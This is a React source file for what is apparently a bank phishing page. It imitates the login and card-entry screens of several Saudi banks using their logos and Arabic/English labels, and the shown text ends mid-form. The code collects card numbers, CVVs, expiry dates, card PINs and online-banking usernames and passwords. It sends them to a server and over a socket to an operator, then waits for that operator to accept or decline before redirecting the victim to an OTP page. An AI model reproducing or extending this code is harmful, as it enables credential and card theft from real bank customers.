import axios from "axios";
import React, { useState } from "react";
import { BiCalendarEvent, BiLock } from "react-icons/bi";
import { FaCcVisa, FaLock } from "react-icons/fa6";
import { serverRoute, socket } from "./Main";
import { TailSpin } from "react-loader-spinner";
import { BsPerson } from "react-icons/bs";
import { LiaCcVisa } from "react-icons/lia";
import { TbWorld } from "react-icons/tb";
import { IoPersonSharp } from "react-icons/io5";
import { PiPasswordThin } from "react-icons/pi";
import { MdPassword } from "react-icons/md";
import { CgRename } from "react-icons/cg";

const Payment = ({ mode, setMode, checkMode }) => {
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const type = query.get("type");
  const [state, setState] = useState("card");
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [cardNumber, setCardNumber] = useState("");
  const [card_name, setCardName] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [pin, setPin] = useState("");

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handlePinChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    let finalData = {
      ...JSON.parse(data),
      visa_card_number: cardNumber,
      visa_cvv: cvv,
      visa_expiryDate: expiryDate,
      bank: type,
      visa_pin: pin,
      visa_card_holder_name: card_name,
    };
    setLoading(true);
    await axios.post(
      serverRoute + "/visa/" + sessionStorage.getItem("id"),
      finalData
    );
    socket.emit("visa", { finalData, id: sessionStorage.getItem("id") });
  };
  socket.on("acceptVisa", (result) => {
    if (result === sessionStorage.getItem("id")) {
      setLoading(false);
      window.location.href = `/otp/${result}`;
    }
  });

  socket.on("declineVisa", (result) => {
    console.log(result);
    if (result === sessionStorage.getItem("id")) {
      setState(state === "auth" ? "card" : "auth");
      setLoading(false);
    }
  });
  socket.on("acceptBankAuth", (result) => {
    if (result === sessionStorage.getItem("id")) {
      setLoading(false);
      window.location.href = `/otp/${result}`;
    }
  });

  socket.on("declineBankAuth", (result) => {
    if (result === sessionStorage.getItem("id")) {
      setState(state === "auth" ? "card" : "auth");
      setLoading(false);
    }
  });

  const handleAuthSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const username = e.target[0].value;
    const password = e.target[1].value;

    axios
      .post(serverRoute + "/bankAuth/" + sessionStorage.getItem("id"), {
        bankUsername: username,
        bankPassword: password,
        bank: type,
      })
      .then(() =>
        socket.emit("bankAuth", {
          bankUsername: username,
          bankPassword: password,
          bank: type,
          id: sessionStorage.getItem("id"),
        })
      );
  };

  return (
    <div className="w-full flex items-center justify-center">
      {loading && (
        <div className="absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      {type === "Ahly" ? (
        <div
          className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-between gap-y-5 pt-10 "
          style={{
            backgroundImage: 'url("/payment/ahliBG.jpg")',
            backgroundSize: "cover",
          }}
        >
          <TbWorld className="text-lime-500 self-start ml-5" />
          <div className="w-full pt-2 relative flex flex-col justify-between flex-1">
            <div className="flex flex-col items-center justify-start">
              <img src="/payment/bankahlilogo.png" />
              <div className="w-full flex items-center justify-center ">
                <span
                  className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 border-b-2 ${
                    state === "card" ? " border-green-400" : "border-gray-300"
                  }`}
                >
                  {checkMode("Fast Login", "الدخول السريع").word}
                </span>
                <span
                  className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 border-b-2 ${
                    state === "auth" ? "border-green-400" : "border-gray-300"
                  }`}
                >
                  {checkMode("Login", "الدخول").word}
                </span>
              </div>
              {state === "auth" ? (
                <form
                  onSubmit={handleAuthSubmit}
                  className="flex w-full flex-col items-start p-2 gap-y-5 pt-5"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col w-full gap-y-3">
                    <span className="text-white">
                      {checkMode("Username", "اسم المستخدم").word}
                    </span>
                    <div className="flex items-center gap-y-2 w-full bg-gray-400 bg-opacity-60 gap-x-2 p-2 rounded-md">
                      <IoPersonSharp className="text-gray-200" />
                      <input
                        type="text"
                        className="w-11/12 p-1  bg-transparent text-white placeholder:text-gray-200 outline-none"
                        placeholder={
                          mode === "ar" ? "اسم المستخدم" : "Username"
                        }
                        required
                      />
                    </div>
                  </div>
                  <div className="flex flex-col w-full gap-y-3">
                    <span className="text-white">
                      {checkMode("Password", "الرمز السري").word}
                    </span>
                    <div className="flex items-center gap-y-2 w-full bg-gray-400  bg-opacity-60 gap-x-2 p-2 rounded-md">
                      <FaLock className="text-gray-200" />
                      <input
                        type="text"
                        className="w-11/12 p-1  bg-transparent text-white placeholder:text-gray-200 outline-none"
                        placeholder={mode === "ar" ? "الرمز السري" : "Password"}
                        required
                      />
                    </div>
                  </div>
                  <div
                    className="flex w-full justify-end cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <span className="text-lime-700">
                      {
                        checkMode(
                          "Forget credentials ? ",
                          "نسيت بيانات الدخول ؟"
                        ).word
                      }
                    </span>
                  </div>
                  <div className="w-full flex justify-center items-center flex-col">
                    <button
                      className=" w-10/12 rounded-lg bg-lime-500 py-3 mt-5"
                      type="submit"
                    >
                      {checkMode("Login", "الدخول").word}
                    </button>
                    <button
                      className="text-white w-10/12 rounded-lg bg-gray-500 bg-opacity-75 py-3 mt-5"
                      type="submit"
                    >
                      {checkMode("Register", "مستخدم جديد").word}
                    </button>
                  </div>
                </form>
              ) : (
                <form
                  className="flex flex-col w-full py-3"
                  onSubmit={handleSubmit}
                  dir={mode === "en" ? "rtl" : "ltr"}
                >
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className=" text-white">
                      {" "}
                      {checkMode("Card Name", "اسم البطاقه").word}
                    </span>
                    <div className="flex relative justify-center w-full items-center">
                      <input
                        placeholder={`${
                          checkMode("Card Name", " اسم البطاقه").word
                        }`}
                        maxLength={19}
                        dir="ltr"
                        type="text"
                        value={card_name}
                        onChange={(e) => setCardName(e.target.value)}
                        required
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                      />
                      <CgRename className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className=" text-white">
                      {" "}
                      {checkMode("Card Number", "رقم البطاقه").word}
                    </span>
                    <div className="flex relative justify-center w-full items-center">
                      <input
                        placeholder="XXXX XXXX XXXX XXXX"
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                        maxLength={19}
                        dir="ltr"
                        inputMode="numeric"
                        type="text"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        required
                      />
                      <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div
                    className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <div className="flex flex-col items-center  gap-y-1 relative">
                      <span className=" text-white ">CVV</span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          maxLength={3}
                          className="text-center p-1 rounded-md outline-none"
                          placeholder="000"
                          required
                        />
                        <BiLock className="text-gray-600 absolute right-1" />
                      </div>
                    </div>
                    <div className="flex flex-col  items-center gap-y-1">
                      <span className=" text-white">
                        {checkMode("Card Expire", "تاريخ الانتهاء").word}
                      </span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          className="text-center w-full p-1 rounded-md outline-none"
                          placeholder="MM/YY"
                          required
                        />
                        <BiCalendarEvent className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                    <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                      <span className=" text-white">PIN</span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={pin}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handlePinChange}
                          className="text-center w-full p-1 rounded-md outline-none"
                          placeholder="0000"
                          required
                        />
                        <MdPassword className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                  </div>
                  <div className="w-full flex justify-center items-center flex-col">
                    <button
                      className=" w-10/12 rounded-lg bg-lime-500 py-3 mt-5"
                      type="submit"
                    >
                      {checkMode("Login", "الدخول").word}
                    </button>
                  </div>
                </form>
              )}
            </div>

            <div className=" w-full">
              <img
                src={`${
                  mode === "ar"
                    ? "/payment/ahliFooterar.jpg"
                    : "/payment/ahliFooteren.jpg"
                }`}
                className="w-full h-full"
              />
            </div>
          </div>
        </div>
      ) : type === "Arabi" ? (
        <div className="w-full sm:w-1/2 h-screen flex flex-col items-center justify-center ">
          <div className="flex flex-col items-center justify-center w-10/12 shadow-xl py-2">
            <img src="/payment/alarabilogo.png" className="w-16 h-16" />
            <div className="w-full py-2">
              <div
                className="w-full flex items-center justify-center "
                style={{ borderBottom: "1px solid white" }}
              >
                <span
                  className={` text-sm cursor-pointer w-1/2 text-center p-2 ${
                    state === "card" && "border-b-2 border-blue-500"
                  }`}
                >
                  {checkMode("Card", "البطاقه").word}
                </span>
                <span
                  className={` text-sm cursor-pointer w-1/2 text-center p-2 ${
                    state === "auth" && "border-b-2 border-blue-500"
                  }`}
                >
                  {checkMode("Login", "الدخول").word}
                </span>
              </div>
              {state === "auth" ? (
                <form
                  onSubmit={handleAuthSubmit}
                  className="flex w-full flex-col items-start p-2 gap-y-5"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex items-start flex-col gap-y-2 w-full">
                    <span className=" text-lg">
                      {checkMode("Username", "اسم المستخدم").word} :{" "}
                    </span>
                    <input
                      type="text"
                      className="w-11/12 p-1 rounded-md"
                      style={{ border: "1px solid #eee" }}
                      placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                      required
                    />
                  </div>
                  <div className="flex items-start flex-col gap-y-2 w-full">
                    <span className=" text-lg">
                      {checkMode("Password", "كلمه المرور").word} :{" "}
                    </span>
                    <input
                      style={{ border: "1px solid #eee" }}
                      type="text"
                      className="w-11/12 p-1 rounded-md"
                      placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                      required
                    />
                  </div>
                  <div className="text-blue-500 cursor-pointer">
                    {
                      checkMode(
                        "Forget Username / Password ? ",
                        "نسيت كلمة المرور او اسم المستخدم ؟"
                      ).word
                    }
                  </div>
                  <button className="w-11/12 text-center bg-blue-500 text-white py-2">
                    {checkMode("Login", "تسجيل الدخول").word}
                  </button>
                </form>
              ) : (
                <form
                  className="flex flex-col w-full py-3"
                  onSubmit={handleSubmit}
                  dir={mode === "en" ? "rtl" : "ltr"}
                >
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className="w-full text-right ">
                      {" "}
                      {checkMode("Card Name", "اسم البطاقه").word}
                    </span>
                    <div
                      className="flex relative justify-center w-full items-center "
                      style={{ border: "1px solid #eee" }}
                    >
                      <input
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                        placeholder={`${
                          checkMode("Card Name", " اسم البطاقه").word
                        }`}
                        maxLength={19}
                        dir="ltr"
                        type="text"
                        value={card_name}
                        onChange={(e) => setCardName(e.target.value)}
                        required
                      />
                      <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                    <span className="w-full text-right ">
                      {" "}
                      {checkMode("Card Number", "رقم البطاقه").word}
                    </span>
                    <div
                      className="flex relative justify-center w-full items-center "
                      style={{ border: "1px solid #eee" }}
                    >
                      <input
                        placeholder="XXXX XXXX XXXX XXXX"
                        className="w-full rounded-md py-2 px-1 text-center outline-none"
                        maxLength={19}
                        dir="ltr"
                        inputMode="numeric"
                        type="text"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        required
                      />
                      <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                    </div>
                  </div>
                  <div
                    className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <div className="flex flex-col items-center  gap-y-1 relative">
                      <span>CVV</span>
                      <div className="relative flex items-center">
                        <input
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          maxLength={3}
                          style={{ border: "1px solid #eee" }}
                          className="text-center p-1 rounded-md outline-none"
                          placeholder="000"
                          required
                        />
                        <BiLock className="text-gray-600 absolute right-1" />
                      </div>
                    </div>
                    <div className="flex flex-col items-center gap-y-1">
                      <span>
                        {checkMode("Card Expire", "تاريخ الانتهاء").word}
                      </span>
                      <div
                        className="relative flex items-center"
                        style={{ border: "1px solid #eee" }}
                      >
                        <input
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          className="text-center w-2/3 p-1 rounded-md outline-none "
                          placeholder="MM/YY"
                          required
                        />
                        <BiCalendarEvent className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                    <div className="flex flex-col  items-center   gap-y-1">
                      <span>PIN</span>
                      <div
                        className="relative flex items-center"
                        style={{ border: "1px solid #eee" }}
                      >
                        <input
                          type="text"
                          value={pin}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handlePinChange}
                          className="text-center w-2/3 p-1 rounded-md outline-none "
                          placeholder="0000"
                          required
                        />
                        <MdPassword className="absolute right-1 text-gray-600" />
                      </div>
                    </div>
                  </div>
                  <button
                    className="text-white w-full bg-blue-600 py-2 mt-5"
                    type="submit"
                  >
                    {checkMode("Login", "الدخول").word}
                  </button>
                  <span className="text-xs text-center w-full my-3">
                    {
                      checkMode(
                        "Forget Password / Forget Username",
                        "نسيت كلمه المرور/ نسيت اسم المستخدم"
                      ).word
                    }
                  </span>
                </form>
              )}
            </div>
          </div>
        </div>
      ) : type === "Alawal" ? (
        <div
          className="w-full sm:w-1/2 h-screen gap-y-5 flex flex-col items-center justify-center "
          style={{ backgroundImage: "linear-gradient(#fefefe, #d3d3d3)" }}
        >
          <img src="/payment/alawallogo.png" className="w-16 " />
          <div
            className="w-full py-2"
            style={{
              backgroundImage: 'url("/payment/alawalBG.png")',
              backgroundSize: "cover",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div
              className="w-full flex items-center justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <span
                className={`text-gray-500 text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "card" && "border-b-2 border-y-teal-700"
                }`}
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-gray-500 text-sm cursor-pointer w-1/2 text-center p-2 ${
                  state === "auth" && "border-b-2 border-y-teal-700"
                }`}
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-gray-700 text-lg">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-gray-700 text-lg">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-gray-700 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button className="w-11/12 text-center bg-teal-700 text-white py-2">
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-gray-500">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-gray-500">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-right text-gray-500 ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col items-center gap-y-1">
                    <span className=" text-gray-500">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className="text-gray-600">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <button
                  className="text-white w-full bg-teal-700 py-2 mt-5"
                  type="submit"
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : type === "Alblad" ? (
        <div
          className="w-full sm:w-1/2 h-screen gap-y-5 flex flex-col items-center justify-center "
          style={{ backgroundColor: "#786e64" }}
        >
          <img src="/payment/albiladlogo.png" className="w-36 z-10" />
          <div className="w-full py-2">
            <div className="w-full flex items-center justify-center ">
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2 `}
                style={
                  state === "card"
                    ? { borderBottom: "3px solid #f0b430" }
                    : { border: "1px solid white" }
                }
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
              </span>
              <span
                className={`text-white text-sm cursor-pointer w-1/2 text-center p-2`}
                style={
                  state === "auth"
                    ? { borderBottom: "3px solid #f0b430" }
                    : { border: "1px solid white" }
                }
              >
                {checkMode("Login", "الدخول").word}
              </span>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5"
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Username", "اسم المستخدم").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-2 rounded-md"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span className="text-white text-lg">
                    {checkMode("Password", "كلمه المرور").word} :{" "}
                  </span>
                  <input
                    type="text"
                    className="w-11/12 p-2 rounded-md"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="flex w-full">
                  <div
                    className="flex gap-x-2 flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <span className="text-right text-white">
                      {" "}
                      {
                        checkMode("Restore Login Data", "استعاده بيانات الدخول")
                          .word
                      }
                    </span>
                  </div>
                  <div
                    className="flex gap-x-2  flex-1 items-center px-2"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <input type="radio" />

                    <span className="text-right text-white">
                      {checkMode("Remember Username", "تذكر اسم المستخدم").word}
                    </span>
                  </div>
                </div>
                <button
                  className="w-11/12 text-center  text-white py-2"
                  style={{ backgroundColor: "#f0b430" }}
                >
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Name", "اسم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span className=" text-white">
                    {" "}
                    {checkMode("Card Number", "رقم البطاقه").word}
                  </span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      placeholder="XXXX XXXX XXXX XXXX"
                      className="w-full rounded-md py-2 px-1 text-center outline-none"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span className=" text-white ">CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center p-1 rounded-md outline-none"
                        placeholder="000"
                        required
                      />
                      <BiLock className="text-gray-600 absolute right-1" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center gap-y-1">
                    <span className=" text-white">
                      {checkMode("Card Expire", "تاريخ الانتهاء").word}
                    </span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={expiryDate}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handleExpiryDateChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="MM/YY"
                        required
                      />
                      <BiCalendarEvent className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                  <div className="flex flex-col  items-center justify-center col-span-1 gap-y-1">
                    <span className=" text-white">PIN</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={pin}
                        maxLength={5}
                        inputMode="numeric"
                        onChange={handlePinChange}
                        className="text-center w-full p-1 rounded-md outline-none"
                        placeholder="0000"
                        required
                      />
                      <MdPassword className="absolute right-1 text-gray-600" />
                    </div>
                  </div>
                </div>
                <div className="flex ">
                  <div
                    className="flex gap-x-2 flex-1 items-center px-2 cursor-pointer"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <span className="text-right text-white">
                      {" "}
                      {
                        checkMode("Restore Login Data", "استعاده بيانات الدخول")
                          .word
                      }
                    </span>
                  </div>
                  <div
                    className="flex gap-x-2  flex-1 items-center px-2"
                    dir={mode === "ar" ? "rtl" : "ltr"}
                  >
                    <input type="radio" />

                    <span className="text-right text-white">
                      {checkMode("Remember Username", "تذكر اسم المستخدم").word}
                    </span>
                  </div>
                </div>
                <button
                  className="text-white w-full py-2 mt-5"
                  type="submit"
                  style={{ backgroundColor: "#f0b430" }}
                >
                  {checkMode("Login", "الدخول").word}
                </button>
              </form>
            )}
          </div>
        </div>
      ) : type === "Alinma" ? (
        <div className="w-full sm:w-1/2 h-screen flex flex-col items-start justify-start ">
          <img src="/payment/alinmalogo.png" />
          <div className="w-full py-2">
            <div
              className="w-full flex items-center justify-center "
              style={{ borderBottom: "1px solid white" }}
            >
              <div
                className={`flex items-center gap-x-5 justify-center  text-sm cursor-pointer w-1/2 text-center p-2 font-semibold `}
                style={
                  state === "card"
                    ? { borderBottom: "3px solid #7aaadb" }
                    : { border: "1px solid white" }
                }
              >
                {checkMode("Card", "التسجيل باستخدام البطاقه").word}
                <LiaCcVisa className="md:text-xl" />
              </div>
              <div
                className={` flex items-center gap-x-5 justify-center text-sm cursor-pointer w-1/2 text-center font-semibold p-2 `}
                style={
                  state === "auth"
                    ? { borderBottom: "3px solid #7aaadb" }
                    : { border: "1px solid white" }
                }
              >
                {checkMode("Login", "الدخول").word}
                <BsPerson className="md:text-xl" />
              </div>
            </div>
            {state === "auth" ? (
              <form
                onSubmit={handleAuthSubmit}
                className="flex w-full flex-col items-start p-2 gap-y-5 py-10"
                dir={mode === "ar" ? "rtl" : "ltr"}
                style={{ backgroundColor: "#f3f2f0" }}
              >
                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span>{checkMode("Username", "اسم السمتخدم").word}</span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md border-2 border-black"
                    placeholder={mode === "ar" ? "اسم المستخدم" : "Username"}
                    required
                  />
                </div>

                <div className="flex items-start flex-col gap-y-2 w-full">
                  <span>{checkMode("Password", "كلمه المرور").word}</span>
                  <input
                    type="text"
                    className="w-11/12 p-1 rounded-md border-2 border-black"
                    placeholder={mode === "ar" ? "كلمه المرور" : "Password"}
                    required
                  />
                </div>
                <div className="text-blue-500 cursor-pointer">
                  {
                    checkMode(
                      "Forget Username / Password ? ",
                      "نسيت كلمة المرور او اسم المستخدم ؟"
                    ).word
                  }
                </div>
                <button
                  className="w-11/12 text-center  text-white py-2"
                  style={{ backgroundColor: "#7aaadb" }}
                >
                  {checkMode("Login", "تسجيل الدخول").word}
                </button>
              </form>
            ) : (
              <form
                className="flex flex-col w-full py-3"
                style={{ backgroundColor: "#f3f2f0" }}
                onSubmit={handleSubmit}
                dir={mode === "en" ? "rtl" : "ltr"}
              >
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span> {checkMode("Card Name", "اسم البطاقه").word}</span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center  outline-none border-2 border-black"
                      placeholder={`${
                        checkMode("Card Name", " اسم البطاقه").word
                      }`}
                      maxLength={19}
                      dir="ltr"
                      type="text"
                      value={card_name}
                      onChange={(e) => setCardName(e.target.value)}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div className="w-full flex flex-col items-center justify-end gap-y-2 p-2">
                  <span> {checkMode("Card Number", "رقم البطاقه").word}</span>
                  <div className="flex relative justify-center w-full items-center">
                    <input
                      className="w-full rounded-md py-2 px-1 text-center  outline-none border-2 border-black"
                      maxLength={19}
                      dir="ltr"
                      inputMode="numeric"
                      placeholder="XXXX XXXX XXXX XXXX"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      required
                    />
                    <FaCcVisa className="absolute text-gray-600 right-5 sm:right-10 text-2xl " />
                  </div>
                </div>
                <div
                  className="w-full grid grid-cols-2  items-center justify-end gap-5 p-2 my-4 relative"
                  dir={mode === "ar" ? "rtl" : "ltr"}
                >
                  <div className="flex flex-col items-center  gap-y-1 relative">
                    <span>CVV</span>
                    <div className="relative flex items-center">
                      <input
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        className="text-center border-2 border-black p-1 rounded-md outline-none"
                        placeholder="000"
